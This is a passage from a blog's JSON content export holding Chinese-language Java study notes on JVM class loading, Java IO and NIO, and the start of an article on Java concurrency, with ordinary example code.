System.out.println(Sub.B); // 2&#125; 接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 &lt;clinit&gt;() 方法。但接口与类不同的是，执行接口的 &lt;clinit&gt;() 方法不需要先执行父接口的 &lt;clinit&gt;() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 &lt;clinit&gt;() 方法。 虚拟机会保证一个类的 &lt;clinit&gt;() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 &lt;clinit&gt;() 方法，其它线程都会阻塞等待，直到活动线程执行 &lt;clinit&gt;() 方法完毕。如果在一个类的 &lt;clinit&gt;() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。 0x4.3.类初始化时机0x4.3.1. 主动引用虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随之发生）： 遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。 使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类； 当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化； 0x4.3.2. 被动引用以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括： 通过子类引用父类的静态字段，不会导致子类初始化。 1System.out.println(SubClass.value); // value 字段在 SuperClass 中定义 通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。 1SuperClass[] sca = new SuperClass[10]; 常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。 1System.out.println(ConstClass.HELLOWORLD); 0x4.4.类与类加载器两个类相等，需要类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。 这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。 0x4.5.类加载器分类从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器： 启动类加载器（Bootstrap ClassLoader），使用 C++ 实现，是虚拟机自身的一部分； 所有其它类的加载器，使用 Java 实现，独立于虚拟机，继承自抽象类 java.lang.ClassLoader。 从 Java 开发人员的角度看，类加载器可以划分得更细致一些： 启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 &lt;JRE_HOME&gt;\\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。 扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将 &lt;JAVA_HOME&gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。 应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 0x4.6.双亲委派模型应用程序是由三种类加载器互相配合从而实现类加载，除此之外还可以加入自己定义的类加载器。 下图展示了类加载器之间的层次关系，称为双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其它的类加载器都要有自己的父类加载器。这里的父子关系一般通过组合关系（Composition）来实现，而不是继承关系（Inheritance）。 0x4.6.1. 工作过程一个类加载器首先将类加载请求转发到父类加载器，只有当父类加载器无法完成时才尝试自己加载。 0x4.6.2. 好处使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。 例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 并放到 ClassPath 中，程序可以编译通过。由于双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，这是因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。rt.jar 中的 Object 优先级更高，那么程序中所有的 Object 都是这个 Object。 0x4.6.3. 实现以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。 1234567891011121314151617181920212223242526272829303132333435363738394041public abstract class ClassLoader &#123; // The parent class loader for delegation private final ClassLoader parent; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false); &#125; protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. c = findClass(name); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name); &#125;&#125; 0x4.7.自定义类加载器实现以下代码中的 FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。 java.lang.ClassLoader 的 loadClass() 实现了双亲委派模型的逻辑，自定义类加载器一般不去重写它，但是需要重写 findClass() 方法。 12345678910111213141516171819202122232425262728293031323334353637383940public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + \".class\"; &#125;&#125; 参考资料 周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011. Chapter 2. The Structure of the Java Virtual Machine Jvm memoryGetting Started with the G1 Garbage Collector JNI Part1: Java Native Interface Introduction and “Hello World” application Memory Architecture Of JVM(Runtime Data Areas) JVM Run-Time Data Areas Android on x86: Java Native Interface and the Android Native Development Kit 深入理解 JVM(2)——GC 算法与内存分配策略 深入理解 JVM(3)——7 种垃圾收集器 JVM Internals 深入探讨 Java 类加载器 Guide to WeakHashMap in Java Tomcat example source code file (ConcurrentCache.java)","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"java虚拟机","slug":"java虚拟机","permalink":"https://blog.cfyqy.com/tags/java%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"ye1s"},{"title":"java IO","slug":"Java IO","date":"2019-06-23T17:32:00.000Z","updated":"2020-04-13T08:02:47.000Z","comments":true,"path":"article/b8b03ac1.html","link":"","permalink":"https://blog.cfyqy.com/article/b8b03ac1.html","excerpt":"java IO操作","text":"java IO操作 转载https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20IO.md 0x1.概览Java 的 I/O 大概可以分成以下几类： 磁盘操作：File 字节操作：InputStream 和 OutputStream 字符操作：Reader 和 Writer 对象操作：Serializable 网络操作：Socket 新的输入/输出：NIO 0x2.磁盘操作File 类可以用于表示文件和目录的信息，但是它不表示文件的内容。 递归地列出一个目录下所有文件： 123456789101112public static void listAllFiles(File dir) &#123; if (dir == null || !dir.exists()) &#123; return; &#125; if (dir.isFile()) &#123; System.out.println(dir.getName()); return; &#125; for (File file : dir.listFiles()) &#123; listAllFiles(file); &#125;&#125; 从 Java7 开始，可以使用 Paths 和 Files 代替 File。 0x3.字节操作0x3.1实现文件复制1234567891011121314151617public static void copyFile(String src, String dist) throws IOException &#123; FileInputStream in = new FileInputStream(src); FileOutputStream out = new FileOutputStream(dist); byte[] buffer = new byte[20 * 1024]; int cnt; // read() 最多读取 buffer.length 个字节 // 返回的是实际读取的个数 // 返回 -1 的时候表示读到 eof，即文件尾 while ((cnt = in.read(buffer, 0, buffer.length)) != -1) &#123; out.write(buffer, 0, cnt); &#125; in.close(); out.close();&#125; 0x3.2装饰者模式Java I/O 使用了装饰者模式来实现。以 InputStream 为例， InputStream 是抽象组件； FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作； FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能。例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。 实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。 12FileInputStream fileInputStream = new FileInputStream(filePath);BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream); DataInputStream 装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。 0x4字符操作0x4.1编码与解码编码就是把字符转换为字节，而解码是把字节重新组合成字符。 如果编码和解码过程使用不同的编码方式那么就出现了乱码。 GBK 编码中，中文字符占 2 个字节，英文字符占 1 个字节； UTF-8 编码中，中文字符占 3 个字节，英文字符占 1 个字节； UTF-16be 编码中，中文字符和英文字符都占 2 个字节。 UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。 Java 的内存编码使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码是为了让一个中文或者一个英文都能使用一个 char 来存储。 0x4.2String 的编码方式String 可以看成一个字符序列，可以指定一个编码方式将它编码为字节序列，也可以指定一个编码方式将一个字节序列解码为 String。 1234String str1 = \"中文\";byte[] bytes = str1.getBytes(\"UTF-8\");String str2 = new String(bytes, \"UTF-8\");System.out.println(str2); 在调用无参数 getBytes() 方法时，默认的编码方式不是 UTF-16be。双字节编码的好处是可以使用一个 char 存储中文和英文，而将 String 转为 bytes[] 字节数组就不再需要这个好处，因此也就不再需要双字节编码。getBytes() 的默认编码方式与平台有关，一般为 UTF-8。 1byte[] bytes = str1.getBytes(); 0x4.3Reader 与 Writer不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。 InputStreamReader 实现从字节流解码成字符流； OutputStreamWriter 实现字符流编码成为字节流。 0x4.4实现逐行输出文本文件的内容123456789101112131415public static void readFileContent(String filePath) throws IOException &#123; FileReader fileReader = new FileReader(filePath); BufferedReader bufferedReader = new BufferedReader(fileReader); String line; while ((line = bufferedReader.readLine()) != null) &#123; System.out.println(line); &#125; // 装饰者模式使得 BufferedReader 组合了一个 Reader 对象 // 在调用 BufferedReader 的 close() 方法时会去调用 Reader 的 close() 方法 // 因此只要一个 close() 调用即可 bufferedReader.close();&#125; 0x5对象操作0x5.1序列化序列化就是将一个对象转换成字节序列，方便存储和传输。 序列化：ObjectOutputStream.writeObject() 反序列化：ObjectInputStream.readObject() 不会对静态变量进行序列化，因为序列化只是保存对象的状态，静态变量属于类的状态。 0x5.2Serializable序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现，但是如果不去实现它的话而进行序列化，会抛出异常。 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws IOException, ClassNotFoundException &#123; A a1 = new A(123, \"abc\"); String objectFile = \"file/a1\"; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile)); objectOutputStream.writeObject(a1); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile)); A a2 = (A) objectInputStream.readObject(); objectInputStream.close(); System.out.println(a2);&#125;private static class A implements Serializable &#123; private int x; private String y; A(int x, String y) &#123; this.x = x; this.y = y; &#125; @Override public String toString() &#123; return \"x = \" + x + \" \" + \"y = \" + y; &#125;&#125; 0x5.3transienttransient 关键字可以使一些属性不会被序列化。 ArrayList 中存储数据的数组 elementData 是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。 1private transient Object[] elementData; 0x6网络操作Java 中的网络支持： InetAddress：用于表示网络上的硬件资源，即 IP 地址； URL：统一资源定位符； Sockets：使用 TCP 协议实现网络通信； Datagram：使用 UDP 协议实现网络通信。 0x6.1InetAddress没有公有的构造函数，只能通过静态方法来创建实例。 12InetAddress.getByName(String host);InetAddress.getByAddress(byte[] address); 0x6.2URL可以直接从 URL 中读取字节流数据。 1234567891011121314151617181920public static void main(String[] args) throws IOException &#123; URL url = new URL(\"http://www.baidu.com\"); /* 字节流 */ InputStream is = url.openStream(); /* 字符流 */ InputStreamReader isr = new InputStreamReader(is, \"utf-8\"); /* 提供缓存功能 */ BufferedReader br = new BufferedReader(isr); String line; while ((line = br.readLine()) != null) &#123; System.out.println(line); &#125; br.close();&#125; 0x6.3Sockets ServerSocket：服务器端类 Socket：客户端类 服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。 0x6.4Datagram DatagramSocket：通信类 DatagramPacket：数据包类 0x7NIO新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的，弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。 0x7.1流与块I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。 面向流的 I/O 一次处理一个字节数据：一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。 面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。 I/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。 0x7.2通道与缓冲区1. 通道 通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。 通道与流的不同之处在于，流只能在一个方向上移动(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。 通道包括以下类型： FileChannel：从文件中读写数据； DatagramChannel：通过 UDP 读写网络中数据； SocketChannel：通过 TCP 读写网络中数据； ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。 缓冲区 发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。 缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。 缓冲区包括以下类型： ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer 0x7.3缓冲区状态变量 capacity：最大容量； position：当前已经读写的字节数； limit：还可以读写的字节数。 状态变量的改变过程举例： ① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。 ② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 为 5，limit 保持不变。 ③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。 ④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。 ⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。 0x7.4文件 NIO 实例以下展示了使用 NIO 快速复制文件的实例： 12345678910111213141516171819202122232425262728293031323334353637public static void fastCopy(String src, String dist) throws IOException &#123; /* 获得源文件的输入字节流 */ FileInputStream fin = new FileInputStream(src); /* 获取输入字节流的文件通道 */ FileChannel fcin = fin.getChannel(); /* 获取目标文件的输出字节流 */ FileOutputStream fout = new FileOutputStream(dist); /* 获取输出字节流的文件通道 */ FileChannel fcout = fout.getChannel(); /* 为缓冲区分配 1024 个字节 */ ByteBuffer buffer = ByteBuffer.allocateDirect(1024); while (true) &#123; /* 从输入通道中读取数据到缓冲区中 */ int r = fcin.read(buffer); /* read() 返回 -1 表示 EOF */ if (r == -1) &#123; break; &#125; /* 切换读写 */ buffer.flip(); /* 把缓冲区的内容写入输出文件中 */ fcout.write(buffer); /* 清空缓冲区 */ buffer.clear(); &#125;&#125; 0x7.5选择器NIO 常常被叫做非阻塞 IO，主要是因为 NIO 在网络通信中的非阻塞特性被广泛使用。 NIO 实现了 IO 多路复用中的 Reactor 模型，一个线程 Thread 使用一个选择器 Selector 通过轮询的方式去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。 通过配置监听的通道 Channel 为非阻塞，那么当 Channel 上的 IO 事件还未到达时，就不会进入阻塞状态一直等待，而是继续轮询其它 Channel，找到 IO 事件已经到达的 Channel 执行。 因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件，对于 IO 密集型的应用具有很好地性能。 应该注意的是，只有套接字 Channel 才能配置为非阻塞，而 FileChannel 不能，为 FileChannel 配置非阻塞也没有意义。 1. 创建选择器1Selector selector = Selector.open(); 2. 将通道注册到选择器上123ServerSocketChannel ssChannel = ServerSocketChannel.open();ssChannel.configureBlocking(false);ssChannel.register(selector, SelectionKey.OP_ACCEPT); 通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。 在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类： SelectionKey.OP_CONNECT SelectionKey.OP_ACCEPT SelectionKey.OP_READ SelectionKey.OP_WRITE 它们在 SelectionKey 的定义如下： 1234public static final int OP_READ = 1 &lt;&lt; 0;public static final int OP_WRITE = 1 &lt;&lt; 2;public static final int OP_CONNECT = 1 &lt;&lt; 3;public static final int OP_ACCEPT = 1 &lt;&lt; 4; 可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如： 1int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE; 3. 监听事件1int num = selector.select(); 使用 select() 来监听到达的事件，它会一直阻塞直到有至少一个事件到达。 4. 获取到达的事件1234567891011Set&lt;SelectionKey&gt; keys = selector.selectedKeys();Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove();&#125; 5. 事件循环因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。 1234567891011121314while (true) &#123; int num = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove(); &#125;&#125; 0x7.5套接字 NIO 实例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public class NIOServer &#123; public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress(\"127.0.0.1\", 8888); serverSocket.bind(address); while (true) &#123; selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // 服务器会为每个新连接创建一个 SocketChannel SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // 这个新连接主要用于从客户端读取数据 sChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); &#125; keyIterator.remove(); &#125; &#125; &#125; private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuilder data = new StringBuilder(); while (true) &#123; buffer.clear(); int n = sChannel.read(buffer); if (n == -1) &#123; break; &#125; buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i &lt; limit; i++) &#123; dst[i] = (char) buffer.get(i); &#125; data.append(dst); buffer.clear(); &#125; return data.toString(); &#125;&#125; 12345678910public class NIOClient &#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket(\"127.0.0.1\", 8888); OutputStream out = socket.getOutputStream(); String s = \"hello world\"; out.write(s.getBytes()); out.close(); &#125;&#125; 0x7.6内存映射文件内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。 向内存映射文件写入可能是危险的，只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。 下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。 1MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024); 0x7.7对比NIO 与普通 I/O 的区别主要有以下两点： NIO 是非阻塞的； NIO 面向块，I/O 面向流。 八、参考资料 Eckel B, 埃克尔, 昊鹏, 等. Java 编程思想 [M]. 机械工业出版社, 2002. IBM: NIO 入门 Java NIO Tutorial Java NIO 浅析 IBM: 深入分析 Java I/O 的工作机制 IBM: 深入分析 Java 中的中文编码问题 IBM: Java 序列化的高级认识 NIO 与传统 IO 的区别 Decorator Design Pattern Socket Multicast","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"java IO","slug":"java-IO","permalink":"https://blog.cfyqy.com/tags/java-IO/"}],"author":"ye1s"},{"title":"java并发","slug":"Java 并发","date":"2019-06-23T04:32:00.000Z","updated":"2020-04-13T08:15:07.389Z","comments":true,"path":"article/b8b034cd.html","link":"","permalink":"https://blog.cfyqy.com/article/b8b034cd.html","excerpt":"Java并发结构","text":"Java并发结构 转载https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md 0x1线程状态转换 0x1.1新建（New） 创建后尚未启动。 0x1.2可运行（Runnable） 可能正在运行，也可能正在等待 CPU 时间片。 包含了操作系统线程状态中的 Running 和 Ready。 0x1.3阻塞（Blocked） 等待获取一个排它锁，如果其线程释放了锁就会结束此状态。 0x1.4无限期等待（Waiting） 等待其它线程显式地唤醒，否则不会被分配 CPU 时间片。 进入方法 退出方法 没有设置 Timeout 参数的 Object.wait() 方法 Object.notify() / Object.notifyAll() 没有设置 Timeout 参数的 Thread.join() 方法 被调用的线程执行完毕 LockSupport.park() 方法 LockSupport.unpark(Thread) 0x1.5限期等待（Timed Waiting） 无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。 调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。 调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。 睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。 阻塞和等待的区别在于，阻塞是被动的，它是在等待获取一个排它锁。而等待是主动的，通过调用 Thread.sleep() 和 Object.wait() 等方法进入。 进入方法 退出方法 Thread.sleep() 方法 时间结束 设置了 Timeout 参数的 Object.wait() 方法 时间结束 / Object.notify() / Object.notifyAll() 设置了 Timeout 参数的 Thread.join() 方法 时间结束 / 被调用的线程执行完毕 LockSupport.parkNanos() 方法 LockSupport.unpark(Thread) LockSupport.parkUntil() 方法 LockSupport.unpark(Thread) 0x1.6死亡（Terminated） 可以是线程结束任务之后自己结束，或者产生了异常而结束。 0x2使用线程有三种使用线程的方法： 实现 Runnable 接口； 实现 Callable 接口； 继承 Thread 类。 实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以说任务是通过线程驱动从而执行的。 0x2.1实现 Runnable 接口需要实现 run() 方法。 通过 Thread 调用 start() 方法来启动线程。 12345public class MyRunnable implements Runnable &#123; public void run() &#123; // ... &#125;&#125; 12345public static void main(String[] args) &#123; MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start();&#125; 0x2.2实现 Callable 接口与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。 12345public class MyCallable implements Callable&lt;Integer&gt; &#123; public Integer call() &#123; return 123; &#125;&#125; 1234567public static void main(String[] args) throws ExecutionException, InterruptedException &#123; MyCallable mc = new MyCallable(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get());&#125; 0x2.3继承 Thread 类同样也是需要实现 run() 方法，因为 Thread 类也实现了 Runable 接口。 当调用 start() 方法启动一个线程时，虚拟机会将该线程放入就绪队列中等待被调度，当一个线程被调度时会执行该线程的 run() 方法。 12345public class MyThread extends Thread &#123; public void run() &#123; // ... &#125;&#125; 1234public static void main(String[] args) &#123; MyThread mt = new MyThread(); mt.start();&#125; 0x2.4实现接口 VS 继承 Thread实现接口会更好一些，因为： Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口； 类可能只要求可执行就行，继承整个 Thread 类开销过大。 0x3基础线程机制0x3.1ExecutorExecutor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。这里的异步是指多个任务的执行互不干扰，不需要进行同步操作。 主要有三种 Executor： CachedThreadPool：一个任务创建一个线程； FixedThreadPool：所有任务只能使用固定大小的线程； SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。 1234567public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 5; i++) &#123; executorService.execute(new MyRunnable()); &#125; executorService.shutdown();&#125; 0x3.2Daemon守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。 当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。 main() 属于非守护线程。 在线程启动之前使用 setDaemon() 方法可以将一个线程设置为守护线程。 12345public static void main(String[] args) &#123; Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true); thread.start();&#125; 0x3.3sleep()Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。 sleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。 1234567public void run() &#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125; 0x3.4yield()对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。 123public void run() &#123; Thread.yield();&#125; 0x4中断一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。 InterruptedException 通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。 对于以下代码，在 main() 